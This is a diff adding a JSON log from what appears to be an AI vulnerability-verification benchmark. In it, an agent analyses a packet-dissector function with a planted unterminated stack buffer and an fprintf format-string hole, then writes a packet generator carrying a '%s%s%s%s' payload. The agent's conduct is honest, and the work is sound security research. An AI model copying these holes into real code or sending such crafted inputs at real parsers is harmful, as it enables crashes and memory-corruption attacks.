@@ -1,0 +1,181 @@
+{
+  "tag": "ws-full-01__vuln_005",
+  "gt": "dissect_bat_vis_v24",
+  "crash_type": "SEGV",
+  "tools_used": [
+    "read_function",
+    "check_reachability",
+    "reach_probe",
+    "submit_evidence"
+  ],
+  "evidence": {
+    "sanitizer_compatible": true,
+    "input_reaches_operand": true,
+    "guard_clamps": "none",
+    "pattern_present": true,
+    "reasoning": "Source shows a real format-string sink and an unterminated stack buffer used as a C string.\n\nIn dissect_bat_vis_v24:\n- vis_packeth_raw_data is a 1024-byte stack array.\n- vis_packeth_raw_data_size is read from the packet and only checked to be <= sizeof(vis_packeth_raw_data). There is no NUL termination written after the for-loop copy.\n- snprintf(d_output_buffer, ..., \"... %s\", vis_packeth_raw_data) treats vis_packeth_raw_data as a C string; if the copied bytes contain no NUL, snprintf will read past the end of the 1024-byte stack buffer (OOB read) until it finds a 0 byte, which ASan can report/crash.\n- Later, if (vis_packeth_raw_data_size > 4) && (strlen(vis_packeth_raw_data) > 4) then fprintf(stderr, d_output_buffer) is called. This is an attacker-controlled format string (d_output_buffer contains raw_data bytes) and can crash (e.g., %s/%n) by reading/writing invalid addresses.\n\nThus a fuzzer input can drive a SEGV/ASan crash via either the OOB read in snprintf/strlen or the format-string in fprintf.\n\nI attempted to run reach_probe to ground with an input containing \"%s%s%s%s\" but the probe infrastructure failed (missing ASan binary path), so no runtime confirmation is available.",
+    "corrected_description": "Two issues in dissect_bat_vis_v24: (1) stack-buffer over-read because vis_packeth_raw_data is filled with up to 1024 bytes from the packet without NUL termination, then used as a C string in snprintf() and strlen(); (2) format-string vulnerability because fprintf(stderr, d_output_buffer) uses attacker-influenced data as the format string (d_output_buffer includes raw_data). Either can lead to SEGV/ASan crash.",
+    "control_flow_to_bug": "handler_bat.vis -> ... -> dissect_bat_vis_v24(tvb,...): read vis_packeth_raw_data_size from tvb; if size <= 1024 copy size bytes into stack vis_packeth_raw_data without appending '\\0'; if tree != NULL call snprintf(d_output_buffer, ..., \"%s\", vis_packeth_raw_data) (may over-read if no NUL in first 1024 bytes); later if vis_packeth_raw_data_size>4 and strlen(vis_packeth_raw_data)>4 call fprintf(stderr, d_output_buffer) where d_output_buffer contains attacker-controlled '%' sequences from raw_data, potentially causing SEGV."
+  },
+  "dynamic": {
+    "any_reach": false,
+    "any_crash": false,
+    "probes": []
+  },
+  "score": 0.65,
+  "verdict": "LIKELY",
+  "basis": "unclamped tainted (no dynamic margin)",
+  "trajectory": [
+    {
+      "iter": 0,
+      "tool": "read_function",
+      "args": {
+        "name": "dissect_bat_vis_v24"
+      },
+      "result": "static void dissect_bat_vis_v24(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree)\n{\n\tstruct vis_packet_v23 *vis_packeth;\n\tuint32_t sender_ip;\n\tproto_tree *bat_vis_tree = NULL;\n\tint vis_packeth_raw_data_size=0;\n\tchar vis_packeth_raw_data[1024];\n\tchar d_output_buffer[1024];\n\n\ttvbuff_t *next_tvb;\n\tint length_remaining, i, offset;\n\n\td_output_buffer[0] = 0;\n\n\tvis_packeth = wmem_new(pinfo->pool, struct vis_packet_v23);\n\n\tsender_ip = tvb_get_ipv4(tvb, 0);\n\tset_address_tvb(&vis_packeth->sender_ip, AT_IPv4, 4, tvb, 0);\n\toffset = 8;\n\tvis_packeth->version = tvb_get_uint8(tvb, offset++);\n\tvis_packeth->gw_class = tvb_get_uint8(tvb, offset++);\n\tvis_packeth->tq_max = tvb_get_uint8(tvb, offset++);\n\tvis_packeth_raw_data_size = tvb_get_uint32(tvb, offset++, 0);\n\toffset += 4;\n\tif ((unsigned long)vis_packeth_raw_data_size > sizeof(vis_packeth_raw_data))\n\t\treturn;\n\n\tfor (i=0; i < vis_packeth_raw_data_size; i++) {\n\t\tvis_packeth_raw_data[i] = tvb_get_uint8(tvb, offset);\n\t\toffset++;\n\t}\n\n\t                       \n\tcol_set_str(pinfo->cinfo, COL_PROTOCOL, \"BAT_VIS\");\n\n\t                     \n\tcol_add_fstr(pinfo->cinfo, COL_INFO, \"Src: %s\",\n\t\t\taddress_with_resolution_to_str(pinfo->pool, &vis_packeth->sender_ip));\n\n\t                   \n\tif (tree) {\n\t\tproto_item *ti;\n\n\t\tti = proto_tree_add_protocol_format(tree, proto_bat_vis, tvb, 0, VIS_PACKET_V23_SIZE,\n\t\t\t\t\t\t\t\t\"B.A.T.M.A.N. Vis, Src: %s\",\n\t\t\t\t\t\t\t\taddress_with_resolution_to_str(pinfo->pool, &vis_packeth->sender_ip));\n\t\tsnprintf(d_output_buffer, sizeof(d_output_buffer), \"B.A.T.M.A.N. Vis, raw_data %s\", vis_packeth_raw_data);\n\t\tbat_vis_tree = proto_item_add_subtree(ti, ett_bat_vis);\n\n\t\t           \n\t\tproto_tree_add_ipv4(bat_vis_tree, hf_bat_vis_vis_orig, tvb, offset, 4, sender_ip);\n\t\toffset += 4;\n\n\t\tproto_tree_add_item(bat_vis_tree, hf_bat_vis_version, tvb, offset, 1, ENC_BIG_ENDIAN);\n\t\toffset += 1;\n\n\t\tproto_tree_add_item(bat_vis_tree, hf_bat_vis_gwflags, tvb, offset, 1, ENC_BIG_ENDIAN);\n\t\toffset += 1;\n\n\t\tproto_tree_add_item(bat_vis_tree, hf_bat_max_tq_v23, tvb, offset, 1, ENC_BIG_ENDIAN);\n\t\t                \n\t}\n\n\tif ((vis_packeth_raw_data_size > 4) && (strlen(vis_packeth_raw_data) > 4))\n\t\tfprintf(stderr, d_output_buffer);\n\n\ttap_queue_packet(bat_tap, pinfo, vis_packeth);\n\n\tlength_remaining = tvb_reported_length_remaining(tvb, offset);\n\n\tfor (i = 0; i < length_remaining; i += VIS_PACKET_V23_DATA_SIZE) {\n\t\tnext_tvb = tvb_new_subset_length(tvb, offset, VIS_PACKET_V23_DATA_SIZE);\n\n\t\tif (have_tap_listener(bat_follow_tap)) {\n\t\t\ttap_queue_packet(bat_follow_tap, pinfo, next_tvb);\n\t\t}\n\n\t\tif (bat_vis_tree != NULL) {\n\t\t\tdissect_vis_entry_v23(next_tvb, pinfo, tree);\n\t\t}\n\n\t\toffset += VIS_PACKET_V23_DATA_SIZE;\n\t}\n\n\tlength_remaining = tvb_reported_length_remaining(tvb, offset);\n\tif (length_remaining > 0) {\n\t\tnext_tvb = tvb_new_subset_remaining(tvb, offset);\n\n\t\tif (have_tap_listener(bat_follow_tap)) {\n\t\t\ttap_queue_packet(bat_follow_tap, pinfo, next_tvb);\n\t\t}\n\n\t\tcall_data_dissector(next_tvb, pinfo, tree);\n\t}\n\n}"
+    },
+    {
+      "iter": 0,
+      "tool": "check_reachability",
+      "args": {
+        "function_name": "dissect_bat_vis_v24"
+      },
+      "result": "{\"reachable\": true, \"call_depth\": 5, \"reached_via\": \"observed\", \"n_callers\": 1}"
+    },
+    {
+      "iter": 1,
+      "tool": "reach_probe",
+      "args": {
+        "generator_code": "def generate()->bytes:\n    # Construct minimal BAT_VIS v24-like packet for dissector.\n    # Layout inferred from code: ipv4(4) + ?(4) then at offset 8: version, gw_class, tq_max, raw_data_size(u32?)\n    # Code uses tvb_get_uint32(tvb, offset++, 0); then offset +=4, so raw_data_size read starting at 11.\n    # We'll just provide enough bytes.\n    raw = b\"%s%s%s%s\"  # format string to trigger fprintf reading stack\n    raw_size = len(raw)\n    pkt = bytearray()\n    pkt += b\"\\x01\\x02\\x03\\x04\"      # sender_ip\n    pkt += b\"\\x00\\x00\\x00\\x00\"      # padding/unknown\n    pkt += b\"\\x18\"  # version\n    pkt += b\"\\x00\"  # gw_class\n    pkt += b\"\\x00\"  # tq_max\n    # raw_data_size: place 4 bytes; but function reads with offset++ then offset+=4, odd.\n    # Put size at next 4 bytes.\n    pkt += raw_size.to_bytes(4,'big')\n    pkt += raw\n    # add some trailing bytes for later fields\n    pkt += b\"\\x00\"*32\n    return bytes(pkt)\n",
+        "target": "dissect_bat_vis_v24"
+      },
+      "result": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/ws-full-01/bugs/vuln_005/bin/address'\"}"
+    },
+    {
+      "iter": 2,
+      "tool": "submit_evidence",
+      "args": {
+        "sanitizer_compatible": true,
+        "input_reaches_operand": true,
+        "guard_clamps": "none",
+        "pattern_present": true,
+        "reasoning": "Source shows a real format-string sink and an unterminated stack buffer used as a C string.\n\nIn dissect_bat_vis_v24:\n- vis_packeth_raw_data is a 1024-byte stack array.\n- vis_packeth_raw_data_size is read from the packet and only checked to be <= sizeof(vis_packeth_raw_data). There is no NUL termination written after the for-loop copy.\n- snprintf(d_output_buffer, ..., \"... %s\", vis_packeth_raw_data) treats vis_packeth_raw_data as a C string; if the copied bytes contain no NUL, snprintf will read past the end of the 1024-byte stack buffer (OOB read) until it finds a 0 byte, which ASan can report/crash.\n- Later, if (vis_packeth_raw_data_size > 4) && (strlen(vis_packeth_raw_data) > 4) then fprintf(stderr, d_output_buffer) is called. This is an attacker-controlled format string (d_output_buffer contains raw_data bytes) and can crash (e.g., %s/%n) by reading/writing invalid addresses.\n\nThus a fuzzer input can drive a SEGV/ASan crash via either the OOB read in snprintf/strlen or the format-string in fprintf.\n\nI attempted to run reach_probe to ground with an input containing \"%s%s%s%s\" but the probe infrastructure failed (missing ASan binary path), so no runtime confirmation is available.",
+        "corrected_description": "Two issues in dissect_bat_vis_v24: (1) stack-buffer over-read because vis_packeth_raw_data is filled with up to 1024 bytes from the packet without NUL termination, then used as a C string in snprintf() and strlen(); (2) format-string vulnerability because fprintf(stderr, d_output_buffer) uses attacker-influenced data as the format string (d_output_buffer includes raw_data). Either can lead to SEGV/ASan crash.",
+        "control_flow_to_bug": "handler_bat.vis -> ... -> dissect_bat_vis_v24(tvb,...): read vis_packeth_raw_data_size from tvb; if size <= 1024 copy size bytes into stack vis_packeth_raw_data without appending '\\0'; if tree != NULL call snprintf(d_output_buffer, ..., \"%s\", vis_packeth_raw_data) (may over-read if no NUL in first 1024 bytes); later if vis_packeth_raw_data_size>4 and strlen(vis_packeth_raw_data)>4 call fprintf(stderr, d_output_buffer) where d_output_buffer contains attacker-controlled '%' sequences from raw_data, potentially causing SEGV."
+      },
+      "result": "{\"received\": true}"
+    }
+  ],
+  "token_log": [
+    {
+      "iter": 0,
+      "model": "gpt-5.2",
+      "input_tokens": 1074,
+      "output_tokens": 62,
+      "total_tokens": 1136,
+      "latency_ms": 1204
+    },
+    {
+      "iter": 1,
+      "model": "gpt-5.2",
+      "input_tokens": 2288,
+      "output_tokens": 337,
+      "total_tokens": 2625,
+      "latency_ms": 4754
+    },
+    {
+      "iter": 2,
+      "model": "gpt-5.2",
+      "input_tokens": 2675,
+      "output_tokens": 585,
+      "total_tokens": 3260,
+      "latency_ms": 8426
+    }
+  ],
+  "token_totals": {
+    "input": 6037,
+    "output": 984,
+    "total": 7021,
+    "llm_calls": 3
+  },
+  "full_messages": [
+    {
+      "role": "system",
+      "content": "You are a vulnerability verifier. All candidate functions are already\nreachable from the fuzzer — do NOT re-litigate reachability as pass/fail. Your job\nis to gather EVIDENCE about whether the reached code actually contains a\ncrashing memory-safety bug of the stated type, then submit it.\n\nGather evidence with the tools:\n- read_function(name): read the real source.\n- check_reachability(function_name): confirm the call graph (depth, direct/indirect).\n- reach_probe(generator_code, target): write Python `def generate()->bytes` that\n  produces an input aiming to REACH `target` (a function name or \"file.c:LINE\").\n  It runs the input on the real ASan binary under gdb and tells you whether the\n  target was reached and whether it crashed. A crash is proof; a reach grounds\n  your judgment. Only a real crash or reach can raise the score above the ceiling —\n  you cannot assert a high score from reading alone.\n- submit_evidence(...): report your structured findings (see its schema). Call it\n  once, last.\n\nTwo of the fields are NOT about scoring — they correct the SP for the downstream\nPoV stage, and you are the right one to write them because you just read the real\ncode (and maybe ran a reach_probe):\n- corrected_description: if the SP's stated bug type/description is wrong or\n  imprecise given the real code, write the accurate one (else restate it).\n- control_flow_to_bug: the real path from the fuzzer entry to the crash site — the\n  key functions, branches, and conditions that must hold to trigger it.\n\nDo NOT pass things \"when in doubt\". Report what the evidence shows. Absence of a\ncrash is not proof of safety; a proven clamp/guard on the tainted value IS\ndisconfirming."
+    },
+    {
+      "role": "user",
+      "content": "Verify this suspicious point.\n\nFuzzer: handler_bat.vis   Sanitizer: address\nFunction: dissect_bat_vis_v24\nClaimed bug type: SEGV\nSuspicious-point description (from the finder — may be imprecise): `vis_packeth_raw_data` (a 1024-byte stack buffer) is filled from the packet without forcing NUL-termination, then `snprintf(d_output_buffer, ..., \"...%s\", vis_packeth_raw_data)` and especially `fprintf(stderr, d_output_buffer)` -- an attacker-controlled format string -- are used; the format-string bug (and strlen on the unterminated buffer) crash.\n\nControl flow to the bug:\n  - handler_bat.vis; dissect_bat_vis_v24 reads raw_data_size (<=1024) bytes into a stack buffer\n  - d_output_buffer is built from the non-terminated raw_data\n  - fprintf(stderr, d_output_buffer) uses attacker data as a format string -> SEGV\n\nThe function is reachable (confirm with check_reachability if useful).\n\nRead the function, judge whether a fuzzer input can drive a SEGV\nthere, optionally reach_probe a candidate input to ground it, then submit_evidence."
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_tYg2d8tEWghbBsjyA8absXjJ",
+          "type": "function",
+          "function": {
+            "name": "read_function",
+            "arguments": "{\"name\": \"dissect_bat_vis_v24\"}"
+          }
+        },
+        {
+          "id": "call_uctGqXYC6nywSFGt8LFs1kvZ",
+          "type": "function",
+          "function": {
+            "name": "check_reachability",
+            "arguments": "{\"function_name\": \"dissect_bat_vis_v24\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_tYg2d8tEWghbBsjyA8absXjJ",
+      "content": "static void dissect_bat_vis_v24(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree)\n{\n\tstruct vis_packet_v23 *vis_packeth;\n\tuint32_t sender_ip;\n\tproto_tree *bat_vis_tree = NULL;\n\tint vis_packeth_raw_data_size=0;\n\tchar vis_packeth_raw_data[1024];\n\tchar d_output_buffer[1024];\n\n\ttvbuff_t *next_tvb;\n\tint length_remaining, i, offset;\n\n\td_output_buffer[0] = 0;\n\n\tvis_packeth = wmem_new(pinfo->pool, struct vis_packet_v23);\n\n\tsender_ip = tvb_get_ipv4(tvb, 0);\n\tset_address_tvb(&vis_packeth->sender_ip, AT_IPv4, 4, tvb, 0);\n\toffset = 8;\n\tvis_packeth->version = tvb_get_uint8(tvb, offset++);\n\tvis_packeth->gw_class = tvb_get_uint8(tvb, offset++);\n\tvis_packeth->tq_max = tvb_get_uint8(tvb, offset++);\n\tvis_packeth_raw_data_size = tvb_get_uint32(tvb, offset++, 0);\n\toffset += 4;\n\tif ((unsigned long)vis_packeth_raw_data_size > sizeof(vis_packeth_raw_data))\n\t\treturn;\n\n\tfor (i=0; i < vis_packeth_raw_data_size; i++) {\n\t\tvis_packeth_raw_data[i] = tvb_get_uint8(tvb, offset);\n\t\toffset++;\n\t}\n\n\t                       \n\tcol_set_str(pinfo->cinfo, COL_PROTOCOL, \"BAT_VIS\");\n\n\t                     \n\tcol_add_fstr(pinfo->cinfo, COL_INFO, \"Src: %s\",\n\t\t\taddress_with_resolution_to_str(pinfo->pool, &vis_packeth->sender_ip));\n\n\t                   \n\tif (tree) {\n\t\tproto_item *ti;\n\n\t\tti = proto_tree_add_protocol_format(tree, proto_bat_vis, tvb, 0, VIS_PACKET_V23_SIZE,\n\t\t\t\t\t\t\t\t\"B.A.T.M.A.N. Vis, Src: %s\",\n\t\t\t\t\t\t\t\taddress_with_resolution_to_str(pinfo->pool, &vis_packeth->sender_ip));\n\t\tsnprintf(d_output_buffer, sizeof(d_output_buffer), \"B.A.T.M.A.N. Vis, raw_data %s\", vis_packeth_raw_data);\n\t\tbat_vis_tree = proto_item_add_subtree(ti, ett_bat_vis);\n\n\t\t           \n\t\tproto_tree_add_ipv4(bat_vis_tree, hf_bat_vis_vis_orig, tvb, offset, 4, sender_ip);\n\t\toffset += 4;\n\n\t\tproto_tree_add_item(bat_vis_tree, hf_bat_vis_version, tvb, offset, 1, ENC_BIG_ENDIAN);\n\t\toffset += 1;\n\n\t\tproto_tree_add_item(bat_vis_tree, hf_bat_vis_gwflags, tvb, offset, 1, ENC_BIG_ENDIAN);\n\t\toffset += 1;\n\n\t\tproto_tree_add_item(bat_vis_tree, hf_bat_max_tq_v23, tvb, offset, 1, ENC_BIG_ENDIAN);\n\t\t                \n\t}\n\n\tif ((vis_packeth_raw_data_size > 4) && (strlen(vis_packeth_raw_data) > 4))\n\t\tfprintf(stderr, d_output_buffer);\n\n\ttap_queue_packet(bat_tap, pinfo, vis_packeth);\n\n\tlength_remaining = tvb_reported_length_remaining(tvb, offset);\n\n\tfor (i = 0; i < length_remaining; i += VIS_PACKET_V23_DATA_SIZE) {\n\t\tnext_tvb = tvb_new_subset_length(tvb, offset, VIS_PACKET_V23_DATA_SIZE);\n\n\t\tif (have_tap_listener(bat_follow_tap)) {\n\t\t\ttap_queue_packet(bat_follow_tap, pinfo, next_tvb);\n\t\t}\n\n\t\tif (bat_vis_tree != NULL) {\n\t\t\tdissect_vis_entry_v23(next_tvb, pinfo, tree);\n\t\t}\n\n\t\toffset += VIS_PACKET_V23_DATA_SIZE;\n\t}\n\n\tlength_remaining = tvb_reported_length_remaining(tvb, offset);\n\tif (length_remaining > 0) {\n\t\tnext_tvb = tvb_new_subset_remaining(tvb, offset);\n\n\t\tif (have_tap_listener(bat_follow_tap)) {\n\t\t\ttap_queue_packet(bat_follow_tap, pinfo, next_tvb);\n\t\t}\n\n\t\tcall_data_dissector(next_tvb, pinfo, tree);\n\t}\n\n}"
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_uctGqXYC6nywSFGt8LFs1kvZ",
+      "content": "{\"reachable\": true, \"call_depth\": 5, \"reached_via\": \"observed\", \"n_callers\": 1}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_XvNwIjnMq8BblxXn1Rk7GfaZ",
+          "type": "function",
+          "function": {
+            "name": "reach_probe",
+            "arguments": "{\"generator_code\":\"def generate()->bytes:\\n    # Construct minimal BAT_VIS v24-like packet for dissector.\\n    # Layout inferred from code: ipv4(4) + ?(4) then at offset 8: version, gw_class, tq_max, raw_data_size(u32?)\\n    # Code uses tvb_get_uint32(tvb, offset++, 0); then offset +=4, so raw_data_size read starting at 11.\\n    # We'll just provide enough bytes.\\n    raw = b\\\"%s%s%s%s\\\"  # format string to trigger fprintf reading stack\\n    raw_size = len(raw)\\n    pkt = bytearray()\\n    pkt += b\\\"\\\\x01\\\\x02\\\\x03\\\\x04\\\"      # sender_ip\\n    pkt += b\\\"\\\\x00\\\\x00\\\\x00\\\\x00\\\"      # padding/unknown\\n    pkt += b\\\"\\\\x18\\\"  # version\\n    pkt += b\\\"\\\\x00\\\"  # gw_class\\n    pkt += b\\\"\\\\x00\\\"  # tq_max\\n    # raw_data_size: place 4 bytes; but function reads with offset++ then offset+=4, odd.\\n    # Put size at next 4 bytes.\\n    pkt += raw_size.to_bytes(4,'big')\\n    pkt += raw\\n    # add some trailing bytes for later fields\\n    pkt += b\\\"\\\\x00\\\"*32\\n    return bytes(pkt)\\n\",\"target\":\"dissect_bat_vis_v24\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_XvNwIjnMq8BblxXn1Rk7GfaZ",
+      "content": "{\"error\": \"[Errno 2] No such file or directory: '/home/ze/fb-graphs/build/ws-full-01/bugs/vuln_005/bin/address'\"}"
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "tool_calls": [
+        {
+          "id": "call_hD8pdpTKOwEY2ezz6Yh2c9yb",
+          "type": "function",
+          "function": {
+            "name": "submit_evidence",
+            "arguments": "{\"sanitizer_compatible\":true,\"input_reaches_operand\":true,\"guard_clamps\":\"none\",\"pattern_present\":true,\"reasoning\":\"Source shows a real format-string sink and an unterminated stack buffer used as a C string.\\n\\nIn dissect_bat_vis_v24:\\n- vis_packeth_raw_data is a 1024-byte stack array.\\n- vis_packeth_raw_data_size is read from the packet and only checked to be <= sizeof(vis_packeth_raw_data). There is no NUL termination written after the for-loop copy.\\n- snprintf(d_output_buffer, ..., \\\"... %s\\\", vis_packeth_raw_data) treats vis_packeth_raw_data as a C string; if the copied bytes contain no NUL, snprintf will read past the end of the 1024-byte stack buffer (OOB read) until it finds a 0 byte, which ASan can report/crash.\\n- Later, if (vis_packeth_raw_data_size > 4) && (strlen(vis_packeth_raw_data) > 4) then fprintf(stderr, d_output_buffer) is called. This is an attacker-controlled format string (d_output_buffer contains raw_data bytes) and can crash (e.g., %s/%n) by reading/writing invalid addresses.\\n\\nThus a fuzzer input can drive a SEGV/ASan crash via either the OOB read in snprintf/strlen or the format-string in fprintf.\\n\\nI attempted to run reach_probe to ground with an input containing \\\"%s%s%s%s\\\" but the probe infrastructure failed (missing ASan binary path), so no runtime confirmation is available.\" ,\"corrected_description\":\"Two issues in dissect_bat_vis_v24: (1) stack-buffer over-read because vis_packeth_raw_data is filled with up to 1024 bytes from the packet without NUL termination, then used as a C string in snprintf() and strlen(); (2) format-string vulnerability because fprintf(stderr, d_output_buffer) uses attacker-influenced data as the format string (d_output_buffer includes raw_data). Either can lead to SEGV/ASan crash.\",\"control_flow_to_bug\":\"handler_bat.vis -> ... -> dissect_bat_vis_v24(tvb,...): read vis_packeth_raw_data_size from tvb; if size <= 1024 copy size bytes into stack vis_packeth_raw_data without appending '\\\\0'; if tree != NULL call snprintf(d_output_buffer, ..., \\\"%s\\\", vis_packeth_raw_data) (may over-read if no NUL in first 1024 bytes); later if vis_packeth_raw_data_size>4 and strlen(vis_packeth_raw_data)>4 call fprintf(stderr, d_output_buffer) where d_output_buffer contains attacker-controlled '%' sequences from raw_data, potentially causing SEGV.\"}"
+          }
+        }
+      ]
+    },
+    {
+      "role": "tool",
+      "tool_call_id": "call_hD8pdpTKOwEY2ezz6Yh2c9yb",
+      "content": "{\"received\": true}"
+    }
+  ]
+}
